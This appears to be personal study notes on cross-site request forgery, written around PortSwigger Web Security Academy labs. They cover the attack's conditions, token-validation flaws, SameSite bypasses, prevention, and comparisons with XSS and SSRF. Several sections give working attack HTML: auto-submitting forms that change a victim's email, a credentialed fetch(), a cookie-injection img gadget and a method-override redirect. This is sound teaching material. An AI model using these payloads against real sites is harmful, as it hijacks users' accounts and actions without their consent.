- **Request Forgery**: the attacker tricks the victim to execute an action **supported** by the system but not expected to be triggered in that very situation.

- **Cross-Site**: the request is originated from another source different from the victim system. Attackers partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

Three conditions must be satisfied:
- **a relevant action**: there is an action within the application that the attacker has a reason to induce, like modifying users' permissions or changing a user's password; 
- **cookie-based session handling**: the application relies solely on session cookies to identify the user who has made the requests;
- **no unpredictable request parameters**: the requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.

## Example

**Typically, the attacker will place a malicious HTML onto a website that they control and then induce victims to visit that website.**

For example, suppose an application contains a function that lets the user change the email address on their account:

```http
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded Content-Length: 30 
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE 
email=wiener@normal-user.com
```

The attacker can construct a (fake) web page containing the following HTML:

```html
<html> 
<body> 
<form action="https://vulnerable-website.com/email/change" method="POST"> 
<input type="hidden" name="email" value="pwned@evil-user.net" /> 
</form> 
<script> document.forms[0].submit(); </script> 
</body> 
</html>
```

If a victim user visits the attacker's web page, the following will happen:

- the attacker's page will trigger an HTTP request to the vulnerable website;
- if the user is logged in to the vulnerable website, their browser will automatically include their session cookie in the request;
- the vulnerable website will process the request in the normal way, treat it as having been made by the victim user, and change their email address.

To add a CSRF token in the forged request, we can insert this line in the HTML form:

```html
<input type="hidden" name="csrf" value="<CSRF_TOKEN>" /> 
```

###### Lab: CSRF vulnerability with no defenses

This lab's email change functionality is vulnerable to CSRF.

Craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server:

```html
<form method="POST" action="https://0abe009403dcb13c80814e53005b00b7.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="pwned@evil-user">
</form>
<script>
document.forms[0].submit();
</script>
```

- Deliver to the victim. The lab should be solved!

## Common defences against CSRF

- **CSRF tokens** - A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When attempting to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token in the request. This makes it very difficult for an attacker to construct a valid request on behalf of the victim.
    
- **SameSite cookies** - *SameSite* is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. To do this, you just have to include the `SameSite` attribute in the `Set-Cookie` response header, along with a preferred value :

	`Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict`

	- SameSite can have 3 main values: 
		- `Strict`: cookies are transmitted only if the request originates from the same domain;
		- `Lax`: since 2021, Chrome enforces `Lax` SameSite restrictions by default (cookies are transmitted only if the request comes from the same domain or top-level navigation, such as clicking on a link or the request uses the `GET` method);
		- `None`: cookies are always transmitted. SameSite restrictions disabled.

- **Referer-based validation** - Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request has been originated from the application's own domain. This is generally less effective than CSRF token validation. 

##### Referer header
The *HTTP Referer header* (which is inadvertently misspelled in the HTTP specification) is an optional request header that contains the URL of the web page that linked to the resource that is being requested. It is generally added automatically by browsers when a user triggers an HTTP request (like when clicking a link or submitting a form).


## Common flaws in CSRF token validation

#### Validation of CSRF token depends on request method

Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.

###### Lab: CSRF where token validation depends on request method

Do the same thing as the previous lab, but this time the request must be a `GET`:

```html
<form method="GET" action="https://0abe009403dcb13c80814e53005b00b7.web-security-academy.net/my-account/change-email">
```

#### Validation of CSRF token depends on token being present

Some applications correctly validate the CSRF token when it is present but skip the validation if the token is omitted.

###### Lab: CSRF where token validation depends on token being present

This lab's email change functionality is vulnerable to CSRF: if the CSRF token is omitted, the validation is skipped.

- Just do the same thing as the previous labs. The script will work since we didn't add a csrf token 

#### CSRF token is not tied to the user session

Some applications do not check that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool. In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.

#### CSRF token is tied to a non-session cookie

Some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together, like in the case below. If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible: the attacker, once logged in using their own account, obtain a valid token and associated cookie and feed their token to the victim in their CSRF attack.

```http
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 68 
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

In the code above, the attacker is constructing a request that, *if runned by the victim*, will have the victim's session cookie and the (injected) attacker's csrf token and csrf cookie (since the csrf token is tied only to the non-session cookie).

###### Lab: CSRF where token is tied to non-session cookie

- Craft some HTML that inject the attacker's csrf token (in the request body) and csrf cookie (`csrfKey` header):

```html
<html>
<body>
<form method="post" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="new_email@example.com">
<input type="hidden" name="csrf" value="<ATTACKER_CSRF>">
</form>
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=mySearch%0d%0aSet-Cookie:csrfKey=<ATTACKER_CSRFKEY>%3b%20SameSite=None"
onerror="document.forms[0].submit()">
</body>
</html>
```

Or simply inject the CSRF token (since the request will be sent by the victim, it'll already contain the victim's session and CSRF cookie):

```html
<script>  
const attacker_csrf = '<ATTACKER_CSRF>';

fetch('https://0ae6006403edf66582ff337d0088009b.web-security-academy.net/my-account/change-email', {  
  method: 'POST',  
  credentials: 'include',  
  mode: 'no-cors',  
  body: `csrf=${attacker_csrf}&email=aaa@example.com`,  
});  
</script>
```

#### CSRF token is simply duplicated in a cookie

Some applications duplicate each token within a cookie and a request parameter. When the request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie (*double submit* defense against CSRF):

```http
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 68 
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa 

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com`
```

In this situation, the attacker can forge a csrf token and a cookie (also invent a new one) which are the same and place them in the request that will be runned by the victim.

## Bypassing SameSite cookie restrictions

In the context of SameSite cookie restrictions, a site is defined as the top-level domain (TLD), usually something like `.com` or `.net`, plus one additional level of the domain name. This is often referred to as the TLD+1.
When determining whether a request is same-site or not, the URL scheme is also taken into consideration

![[tld.png]]

#### What's the difference between a site and an origin?

The difference between a site and an origin is their scope; a site encompasses multiple domain names, whereas an origin only includes one.

|                           |                                |                       |                            |
| ------------------------- | ------------------------------ | --------------------- | -------------------------- |
| **Request from**          | **Request to**                 | **Same-site?**        | **Same-origin?**           |
| `https://example.com`     | `https://example.com`          | Yes                   | Yes                        |
| `https://app.example.com` | `https://intranet.example.com` | Yes                   | No: mismatched domain name |
| `https://example.com`     | `https://example.com:8080`     | Yes                   | No: mismatched port        |
| `https://example.com`     | `https://example.co.uk`        | No: mismatched eTLD   | No: mismatched domain name |
| `https://example.com`     | `http://example.com`           | No: mismatched scheme | No: mismatched scheme      |

#### Bypassing SameSite Lax restrictions using GET requests

Servers don't always check whether they receive a `GET` or `POST` request to a given endpoint, even those that are expecting a form submission. In these cases, an attacker could perform a `GET` request submitting a `POST` form, like this:

```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST"> 
	<input type="hidden" name="_method" value="GET"> 
	<input type="hidden" name="recipient" value="hacker"> 
	<input type="hidden" name="amount" value="1000000"> 
</form>
```

###### Lab: SameSite Lax bypass via method override

- You can override the `POST` method by sending a `GET` request but with the following request parameter `_method=POST`, like this:

```html
<html> 
<body> 
	<script>
	    document.location = "https://0ad2004603faaf888227512700ea00e3.web-security-academy.net/my-account/change-email?email=pwned5336@example.com&_method=POST";
	</script>
</body> 
</html>
```

#### Bypassing SameSite restrictions using on-site gadgets

If a cookie is set with the `SameSite=Strict` attribute, browsers won't include it in any cross-site requests unless you can find a **gadget** that results in a new request within the same site.

One possible gadget is a **client-side redirect** that dynamically constructs the redirection target using attacker-controllable input like URL parameters.

If you can manipulate this gadget to elicit a malicious secondary request, this can enable you to bypass any SameSite cookie restrictions completely.

## Prevention

- **CSRF tokens**: must be generated and stored server-side. The token must meet the following criteria:
	- Unpredictable with high entropy, as for session tokens in general.
	- Tied to the user's session.
	- Strictly validated in every case before the relevant action is executed.
	- Should be treated as secrets
- **SameSite cookies**: if you can, use the `Strict` SameSite restrictions!

##### Cookie jars
A **cookie jar** is a data structure used by applications or libraries to manage HTTP cookies associated with web requests and responses. It can be seen as a sort of a container that keeps track of all the cookies received and sent during a session and associates cookies with domains, paths and other restrictions like the `Secure` or `HttpOnly` flags.


## [XSS](XSS%20(Cross-Site%20Scripting).md) vs CSRF

|                               | **XSS**                                                                                            | **CSRF**                                                                     |
| ----------------------------- | -------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| **Main difference**           | Attackers can execute custom scripts on a victim’s browser due to improper validation and escaping | Attackers induce users to perform actions that they do not intend to perform |
| **What can the attacker do?** | Can trigger actions which<br>may not be supported<br>by the system                                 | Can only exploit already implemented actions                                 |
| **Always blind?**             | No                                                                                                 | Yes                                                                          |

- XSS gives more freedom
- XSS implies CSRF: if there is XSS, the legitimate CSRF token can be stolen
- CSRF protection makes XSS more difficult (CSRF tokens make difficult to do XSS from another domain), but doesn’t disable XSS and it has no effect on stored XSS

## [SSRF](SSRF%20(Server-Side%20Request%20Forgery).md) vs CSRF

|                   | **SSRF**                                             | **CSRF**                                                                                             |
| ----------------- | ---------------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| **Executed from** | Server                                               | User client                                                                                          |
| **Objective**     | Lets an attacker send requests on behalf of a server | The attacker tricks the victim to execute an action from another source (controlled by the attacker) |
| **Auth needed?**  | No (ma we can exploit server privileges)             | Yes (it depends on the user session)                                                                 |
| **Always blind?** | No                                                   | Yes                                                                                                  |
